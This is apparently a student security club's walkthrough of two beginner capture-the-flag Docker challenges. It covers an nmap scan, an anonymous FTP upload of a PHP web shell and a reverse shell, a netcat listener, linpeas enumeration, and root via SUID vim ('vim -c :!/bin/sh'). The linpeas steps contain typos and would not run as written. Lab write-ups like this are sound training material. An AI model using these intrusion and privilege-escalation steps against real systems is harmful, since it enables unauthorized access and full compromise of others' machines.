# ComSec Introduction Writeup


## Nmap 1
Welcome to ComSec's first challenge! This week we will be targeting a docker container, to start it, issue the following two commands:

```sh
$ wget https://cov-comsec.github.io/posts/welcome_nmap/c1/docker-compose.yaml
$ sudo docker-compose up
[sudo] password for kali: 
WARNING: Found orphan containers (kali_evilweb_1) for this project. If you removed or renamed this service in your compose file, you can run this command with the --remove-orphans flag to clean it up.
Recreating kali_ftp_1  ... done
Recreating kali_smtp_1 ... done
Starting kali_ssh_1    ... done
Creating kali_web_1    ... done
Attaching to kali_web_1, kali_ssh_1, kali_smtp_1, kali_ftp_1
ftp_1   | Starting Pure-FTPd:
ftp_1   |   pure-ftpd  -c 30 -C 10 -l puredb:/etc/pure-ftpd/pureftpd.pdb -j -R -P localhost -p 30000:30059  
web_1   | AH00558: apache2: Could not reliably determine the server's fully qualified domain name, using 192.168.42.4. Set the 'ServerName' directive globally to suppress this message
web_1   | AH00558: apache2: Could not reliably determine the server's fully qualified domain name, using 192.168.42.4. Set the 'ServerName' directive globally to suppress this message
web_1   | [Fri Oct 22 23:08:37.325178 2021] [mpm_prefork:notice] [pid 1] AH00163: Apache/2.4.25 (Debian) PHP/7.3.4 configured -- resuming normal operations
web_1   | [Fri Oct 22 23:08:37.326184 2021] [core:notice] [pid 1] AH00094: Command line: 'apache2 -D FOREGROUND'
```
**NB:** Despite the output, the target machine will be launched at 192.168.42.1!

### Nmap Scan
Now the point of this week is to learn Nmap, so lets start a scan with service detection and scripting turned on:

```sh
$ nmap -sV -sC 192.168.42.1 -T4
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-22 19:14 EDT
Nmap scan report for 192.168.42.1
Host is up (0.00021s latency).
Not shown: 996 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Pure-FTPd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV IP 127.0.0.1 is not the same as 192.168.42.1
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 f5:f2:1d:64:04:1b:fd:92:22:7e:6b:71:b7:f4:72:49 (RSA)
|   256 4b:80:f8:74:c0:8d:aa:40:fc:38:02:16:9f:1c:3b:bd (ECDSA)
|_  256 a8:08:e5:35:12:d6:a4:cc:74:8f:4c:9c:02:62:f4:f1 (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: 8d1d2dc2ddf0.lan, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
| ssl-cert: Subject: commonName=8d1d2dc2ddf0
| Subject Alternative Name: DNS:8d1d2dc2ddf0
| Not valid before: 2020-08-14T10:33:23
|_Not valid after:  2030-08-12T10:33:23
|_ssl-date: TLS randomness does not represent time
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/ftp-uploads
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
Service Info: Host:  8d1d2dc2ddf0.lan; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.25 seconds
```

It looks like we have 4 ports open. Let's check out the [web server](http://192.168.42.1).

From the scan, we can see that there is a directory named [/ftp-uploads](http://192.168.42.1) and we can see that a flag file has been stored.

![ftpanonymous](imgs/ftp_anonymous.png)

So you have one flag.To be honest this flag works more like a hint to tell you what you should do after this. So if you go back to your nmap scan you will see that you have a line "21/tcp open ftp Pure-ftp" so we have a file transfer protocol it is always good to check as this can sometimes be used for file upload to the machine you are attacking. But what's the mean of ftp-anonymous if you do a fast google search you will find out that when this happens you can have acces to ftp server without having to know the credentials.So lets try to connect to the ftp.

```bash
ftp 192.168.42.1
```
You will be asked to input the Name. You just have to type anonymous to connect.
If you do a "ls" you will be able do see the a file called FTPflag.txt which is the same file you found in the website. You type help you will see as the commands that you can use inside the ftp, we want to upload p0wnyshell so that we can get access to the machine through the browser. For now you just need to know that we are using p0wnyshell as our reverse-shell. So "ctrl+c" to stop the ftp connection clone p0wny shell repository [P0wny-Shell](http://github.com/flozz/p0wny-shell.git).
```bash
cd p0wny-shell
ftp 192.168.42.1
put shell.php
```
The last command is going to upload our shell.
If you go back to your browser and back to "/ftp-uploads/anonymous" you will see the file shell.php in there clicked and you will have p0wny-shell.![p0wny-shell](imgs/pwnyshell.png) So you succefully entered the machine. Let's look for the last flag. A easy way to find files on linux is using the file command.
```bash
find / -name "*.txt" 2>/dev/null
```
![findcommand](imgs/find_command.png)

Congratulations! Lets move to docker2

## Nmap 2

To start this challenge, use:

```sh
wget https://cov-comsec.github.io/posts/welcome_nmap/c2/docker-compose.yaml
docker-compose up
```

So to prove how important is nmap we setup a second nmap challenge but right now we not following the common ports as you can see in here. We mangled the ports from the [StandardPorts](imgs/commonports.pdf)

```bash
sudo nmap -sC -sV 192.168.42.1 -p-
```

![nmap2scan](imgs/nmap_2_scan.png)

In this challenge the ftp part is the same as the first challenge and the first flag is the same, the only difference is that the ports have been changed so if you to "http://192.168.42.1" the website is not going to load you need to instead look for something like this "192.168.42.1:8080".
So lets pass to the second part uploading files to ftp. We have ftp running on port 2121 (2121/tcp ccproxy-ftp) last time you use "ftp $ip" to connect this time that wont work cause you will need to specify the port os instead use something like this "ftp $ip port"
```bash
ftp 192.168.42.1 2121
```
Again use anonymous as login. 
In this challegne we introduced privesc so we will need a scrip to enumerate all te services that are being run on the machine, file permissions, file types, sym links ,etc.
There are 2 that are I know, LinEnum and linpeas. I prefer [linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh){target=_blank}, instead of cloning the repository what I did is I open my prefered text editor on my kali box and I just copy/pasted the script. Then I stopped the ftp connection I cd to the directory where I have linpeas, I started the connection again and use the "put linpeas.sh" to copy linpeas to the machine. Besides linpeas we will need a php reverse shell, cause p0wny shell is not going to work in this challenge. Another good resource to put in your bookmarks, [PentestMonkeys](https://github.com/pentestmonkey/php-reverse-shell){target=_blank} I did the same process with both linpeas and the [php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php){target=_blank} so open your editor and "ctrl+c / ctrl+v" put hte ip of your kali box in the line where you see "" \\change this" and upload the file to the ftp.
So right now you should see something like this 

![ftpfodler](imgs/uploads2.png)

Which means you ready. Open a terminal and start netcat.
```bash
nc -lvnp 1234
```
Go to "192.168.42.1:8080/ftp-uploads/php-reverse-shell.php" the site should be loading for ever. If you go back to your terminal you should have access to the box.
Tip: everytime I get a reverse shell I try to find out what user I am.
```bash
whoami
```
Lets not forget we are in /var/www , we need to copy our linpeas script to tmp folder.
```bash
cp linpeas.sh /tmp
chmod +x linpeas.sh
./linpeash.sh
```
Take a look at the output and try to find the SUID section. If you don't know SUID is a type of permission that you have on linux that let's the user run the file or binary. 

![linpeas](imgs/linpeas.png)

That last line mentioning vim.basic maybe we can do some research and see how we can exploit it. Fortunately there is a good resource called [GTFOBins](https://gtfobins.github.io/) which is used for looking how we can exploit binaries look for vim and you will see that you can spawn a shell inside vim or using the command. 

```sh
:!/bin/sh
#or
vim -c ':!/bin/sh'
```

Now you are root!

```sh
cd /root
cat flag.txt
```

Congratulations on solving the first ComSec challenge. Don't forget to submit your flags on CTFd. If you need any help, feel free to comment below or contact us on discord!

